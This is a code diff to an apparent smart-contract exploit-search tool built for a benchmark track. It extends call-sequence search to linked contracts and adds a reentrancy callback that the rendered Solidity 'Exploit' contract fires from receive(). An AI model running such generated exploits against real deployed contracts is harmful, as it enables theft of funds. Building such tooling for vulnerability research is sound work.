@@ -8,17 +8,20 @@ import re
 from collections.abc import Mapping, Sequence
 from dataclasses import dataclass
 from pathlib import Path
+from typing import Any
 
-from qprover.analysis import FunctionFacts
 from qprover.trust404_analysis import Track04Analysis, compile_track04_target
 
 OFFICIAL_SCHEMA = "trust404.track04.manifest/0.1"
 SELF_ADDRESS = "__QPROVER_SELF__"
 OTHER_ADDRESS = "__QPROVER_OTHER__"
 TARGET_ADDRESS = "__QPROVER_TARGET__"
+ADDRESS_REF_PREFIX = "__QPROVER_ADDRESS_REF__:"
 EXIT_FOUND = 0
 EXIT_NOT_FOUND = 1
 EXIT_ERROR = 2
+
+_CONTRACT_TYPE = re.compile(r"^(?:contract|interface)\s+([A-Za-z_]\w*)")
 
 
 class ManifestContractError(ValueError):
@@ -157,6 +160,8 @@ class Track04Action:
     storage_reads: tuple[str, ...]
     storage_writes: tuple[str, ...]
     provenance: tuple[str, ...]
+    target_path: tuple[str, ...] = ()
+    callback_enabled: bool = False
 
 
 @dataclass(frozen=True, slots=True)
@@ -178,7 +183,26 @@ class Track04SearchModel:
     analysis: Track04Analysis
 
 
-def _abi_values(abi_type: str, manifest: Track04Manifest) -> tuple[object, ...]:
+def _address_ref(path: tuple[str, ...]) -> str:
+    return ADDRESS_REF_PREFIX + "|".join(path)
+
+
+def _decode_address_ref(value: str) -> tuple[str, ...]:
+    if not value.startswith(ADDRESS_REF_PREFIX):
+        raise ValueError("not a QProver address reference")
+    encoded = value[len(ADDRESS_REF_PREFIX) :]
+    path = tuple(item for item in encoded.split("|") if item)
+    if not path:
+        raise ValueError("address reference path must be nonempty")
+    return path
+
+
+def _abi_values(
+    abi_type: str,
+    manifest: Track04Manifest,
+    *,
+    address_refs: tuple[str, ...] = (),
+) -> tuple[object, ...]:
     if re.fullmatch(r"uint(?:[0-9]+)?", abi_type):
         width_text = abi_type[4:]
         width = int(width_text) if width_text else 256
@@ -200,7 +224,16 @@ def _abi_values(abi_type: str, manifest: Track04Manifest) -> tuple[object, ...]:
         maximum = (1 << (width - 1)) - 1
         return (0, 1, -1, minimum, maximum)
     if abi_type == "address":
-        return (SELF_ADDRESS, OTHER_ADDRESS, TARGET_ADDRESS)
+        return tuple(
+            dict.fromkeys(
+                (
+                    *address_refs,
+                    SELF_ADDRESS,
+                    TARGET_ADDRESS,
+                    OTHER_ADDRESS,
+                )
+            )
+        )
     if abi_type == "bool":
         return (False, True)
     if abi_type == "bytes32":
@@ -219,9 +252,13 @@ def _variants(
     payable: bool,
     manifest: Track04Manifest,
     *,
+    address_refs: tuple[str, ...] = (),
     cap: int = 24,
 ) -> tuple[Track04Variant, ...]:
-    domains = [_abi_values(param_type, manifest) for param_type in param_types]
+    domains = [
+        _abi_values(param_type, manifest, address_refs=address_refs)
+        for param_type in param_types
+    ]
     if any(not domain for domain in domains):
         return ()
     products = itertools.product(*domains) if domains else ((),)
@@ -242,7 +279,7 @@ def _variants(
     return tuple(result)
 
 
-def _function_utility(function: FunctionFacts) -> float:
+def _function_utility(function: Any, *, callback_enabled: bool = False) -> float:
     """Label-neutral relevance prior based only on semantic compiler facts."""
 
     score = 0.10
@@ -256,7 +293,109 @@ def _function_utility(function: FunctionFacts) -> float:
         score += 0.20
     if function.external_call_before_write:
         score += 0.10
+    if callback_enabled:
+        score += 0.10
     return round(min(1.0, score), 6)
+
+
+def _contract_identity(contract: Any) -> tuple[str, str]:
+    return str(contract.source_name), str(contract.name)
+
+
+def _resolve_contract_type(report: Any, current: Any, type_name: str) -> Any | None:
+    try:
+        return report.contract(current.source_name, type_name)
+    except KeyError:
+        try:
+            return report.contract(type_name)
+        except KeyError:
+            return None
+
+
+def _reachable_contracts(
+    analysis: Track04Analysis, *, max_depth: int = 3
+) -> tuple[tuple[tuple[str, ...], Any], ...]:
+    root = analysis.report.contract(analysis.source_name, analysis.contract_name)
+    queue: list[tuple[tuple[str, ...], Any, frozenset[tuple[str, str]]]] = [
+        ((), root, frozenset({_contract_identity(root)}))
+    ]
+    result: list[tuple[tuple[str, ...], Any]] = []
+    index = 0
+    while index < len(queue):
+        path, contract, ancestry = queue[index]
+        index += 1
+        result.append((path, contract))
+        if len(path) >= max_depth:
+            continue
+        abi_signatures = set(getattr(contract, "abi_signatures", ()))
+        for storage in sorted(
+            getattr(contract, "storage", ()), key=lambda item: str(item.name)
+        ):
+            match = _CONTRACT_TYPE.match(str(storage.type_name))
+            if match is None:
+                continue
+            getter = f"{storage.name}()"
+            if getter not in abi_signatures:
+                continue
+            reached = _resolve_contract_type(analysis.report, contract, match.group(1))
+            if reached is None:
+                continue
+            identity = _contract_identity(reached)
+            if identity in ancestry:
+                continue
+            queue.append(
+                (
+                    (*path, getter),
+                    reached,
+                    ancestry | frozenset({identity}),
+                )
+            )
+    return tuple(result)
+
+
+def _function_effects(report: Any) -> Mapping[str, tuple[frozenset[str], frozenset[str]]]:
+    functions = {
+        function.canonical_id: function
+        for contract in report.contracts
+        for function in contract.functions
+    }
+    memo: dict[str, tuple[frozenset[str], frozenset[str]]] = {}
+
+    def visit(
+        function_id: str, active: frozenset[str]
+    ) -> tuple[frozenset[str], frozenset[str]]:
+        if function_id in memo:
+            return memo[function_id]
+        function = functions[function_id]
+        reads = set(function.transitive_storage_reads)
+        writes = set(function.transitive_storage_writes)
+        if function_id in active:
+            return frozenset(reads), frozenset(writes)
+        next_active = active | frozenset({function_id})
+        for call in function.calls:
+            callee_id = getattr(call, "callee_id", None)
+            if callee_id not in functions or callee_id in next_active:
+                continue
+            nested_reads, nested_writes = visit(callee_id, next_active)
+            reads.update(nested_reads)
+            writes.update(nested_writes)
+        result = frozenset(reads), frozenset(writes)
+        memo[function_id] = result
+        return result
+
+    for function_id in sorted(functions):
+        visit(function_id, frozenset())
+    return memo
+
+
+def _action_id(
+    target_path: tuple[str, ...], signature: str, *, callback_enabled: bool
+) -> str:
+    if target_path:
+        identifier = f"call:{'/'.join(target_path)}:{signature}"
+    else:
+        identifier = f"call:{signature}"
+    return identifier + ("@callback" if callback_enabled else "")
 
 
 def build_search_model(
@@ -276,58 +415,77 @@ def build_search_model(
         solc_version=manifest.solc,
         evm_version=manifest.evm_version,
     )
-    contract = analysis.report.contract(analysis.source_name, analysis.contract_name)
-    functions = tuple(
-        function
-        for function in contract.functions
-        if function.visibility in {"public", "external"}
-        and function.state_mutability not in {"view", "pure"}
-        and function.function_selector is not None
-    )
+    reachable = _reachable_contracts(analysis)
+    address_refs = tuple(_address_ref(path) for path, _ in reachable if path)
+    effects = _function_effects(analysis.report)
+
     actions: list[Track04Action] = []
     variants: list[Track04Variant] = []
-    function_by_action: dict[str, FunctionFacts] = {}
     utilities: dict[str, float] = {}
-    for function in functions:
-        action_id = f"call:{function.signature}"
-        utility = _function_utility(function)
-        action_variants = _variants(
-            action_id,
-            function.signature,
-            function.parameters,
-            function.state_mutability == "payable",
-            manifest,
+
+    for target_path, contract in reachable:
+        functions = tuple(
+            function
+            for function in contract.functions
+            if function.visibility in {"public", "external"}
+            and function.state_mutability not in {"view", "pure"}
+            and function.function_selector is not None
         )
-        if not action_variants:
-            continue
-        action = Track04Action(
-            id=action_id,
-            kind="call",
-            signature=function.signature,
-            function_id=function.canonical_id,
-            param_types=function.parameters,
-            payable=function.state_mutability == "payable",
-            utility=utility,
-            storage_reads=function.transitive_storage_reads,
-            storage_writes=function.transitive_storage_writes,
-            provenance=(function.source_name, function.source_span),
-        )
-        actions.append(action)
-        variants.extend(action_variants)
-        function_by_action[action_id] = function
-        utilities[action_id] = utility
+        for function in functions:
+            reads, writes = effects.get(
+                function.canonical_id,
+                (
+                    frozenset(function.transitive_storage_reads),
+                    frozenset(function.transitive_storage_writes),
+                ),
+            )
+            modes = (False, True) if function.external_call_before_write else (False,)
+            for callback_enabled in modes:
+                action_id = _action_id(
+                    target_path,
+                    function.signature,
+                    callback_enabled=callback_enabled,
+                )
+                utility = _function_utility(
+                    function, callback_enabled=callback_enabled
+                )
+                action_variants = _variants(
+                    action_id,
+                    function.signature,
+                    function.parameters,
+                    function.state_mutability == "payable",
+                    manifest,
+                    address_refs=address_refs,
+                )
+                if not action_variants:
+                    continue
+                actions.append(
+                    Track04Action(
+                        id=action_id,
+                        kind="call",
+                        signature=function.signature,
+                        function_id=function.canonical_id,
+                        param_types=function.parameters,
+                        payable=function.state_mutability == "payable",
+                        utility=utility,
+                        storage_reads=tuple(sorted(reads)),
+                        storage_writes=tuple(sorted(writes)),
+                        provenance=(function.source_name, function.source_span),
+                        target_path=target_path,
+                        callback_enabled=callback_enabled,
+                    )
+                )
+                variants.extend(action_variants)
+                utilities[action_id] = utility
 
     transitions: dict[tuple[str, str], float] = {}
     for first in actions:
-        first_function = function_by_action[first.id]
-        first_writes = set(first_function.transitive_storage_writes)
+        first_writes = set(first.storage_writes)
         for second in actions:
             if first.id == second.id:
                 continue
-            second_function = function_by_action[second.id]
             dependency = first_writes.intersection(
-                set(second_function.transitive_storage_reads)
-                | set(second_function.transitive_storage_writes)
+                set(second.storage_reads) | set(second.storage_writes)
             )
             if not dependency:
                 continue
@@ -344,9 +502,18 @@ def build_search_model(
         ),
         utilities={key: utilities[key] for key in sorted(utilities)},
         transitions={key: transitions[key] for key in sorted(transitions)},
-        max_sequence_length=4,
+        max_sequence_length=6,
         analysis=analysis,
     )
+
+
+def _address_expression(root: str, path: tuple[str, ...]) -> str:
+    expression = root
+    for getter in path:
+        expression = (
+            f'_readAddress({expression}, abi.encodeWithSignature("{getter}"))'
+        )
+    return expression
 
 
 def _solidity_literal(value: object) -> str:
@@ -356,6 +523,8 @@ def _solidity_literal(value: object) -> str:
         return "address(0x000000000000000000000000000000000000bEEF)"
     if value == TARGET_ADDRESS:
         return "target"
+    if isinstance(value, str) and value.startswith(ADDRESS_REF_PREFIX):
+        return _address_expression("target", _decode_address_ref(value))
     if type(value) is bool:
         return "true" if value else "false"
     if type(value) is int:
@@ -383,20 +552,54 @@ def render_candidate(model: Track04SearchModel, candidate: object) -> str:
         raise ValueError("candidate must contain at least one step")
     actions = {action.id: action for action in model.actions}
     lines: list[str] = []
+    callback_needed = False
     for step in steps:
         action = actions.get(step.action_id)
         if action is None:
             raise ValueError(f"unknown action {step.action_id!r}")
-        lines.append(
-            f"_mustCall(target, {int(step.value_wei)}, "
-            + _encode_signature(action.signature, tuple(step.args))
-            + ");"
-        )
+        action_target = _address_expression("target", action.target_path)
+        call_data = _encode_signature(action.signature, tuple(step.args))
+        if action.callback_enabled:
+            callback_needed = True
+            lines.extend(
+                (
+                    f"_callbackTarget = {action_target};",
+                    f"_callbackData = {call_data};",
+                    "_callbackBudget = 3;",
+                    f"_mustCall({action_target}, {int(step.value_wei)}, _callbackData);",
+                    "_callbackTarget = address(0);",
+                    "delete _callbackData;",
+                    "_callbackBudget = 0;",
+                )
+            )
+        else:
+            lines.append(
+                f"_mustCall({action_target}, {int(step.value_wei)}, {call_data});"
+            )
+
+    callback_fields = ""
+    receive_block = "\n    receive() external payable {}\n"
+    if callback_needed:
+        callback_fields = """
+    address private _callbackTarget;
+    bytes private _callbackData;
+    uint256 private _callbackBudget;
+"""
+        receive_block = """
+    receive() external payable {
+        if (_callbackTarget != address(0) && _callbackBudget > 0) {
+            _callbackBudget -= 1;
+            (bool ok,) = _callbackTarget.call(_callbackData);
+            require(ok, "qprover-callback");
+        }
+    }
+"""
+
     body = "\n".join(f"        {line}" for line in lines)
     return f"""// SPDX-License-Identifier: MIT
 pragma solidity 0.8.24;
 
-contract Exploit {{
+contract Exploit {{{callback_fields}
     function run(address target) external payable {{
 {body}
     }}
@@ -406,8 +609,12 @@ contract Exploit {{
         require(ok, "qprover-call");
     }}
 
-    receive() external payable {{}}
-}}
+    function _readAddress(address target, bytes memory data) private view returns (address value) {{
+        (bool ok, bytes memory result) = target.staticcall(data);
+        require(ok && result.length >= 32, "qprover-address");
+        value = abi.decode(result, (address));
+    }}
+{receive_block}}}
 """
 
 
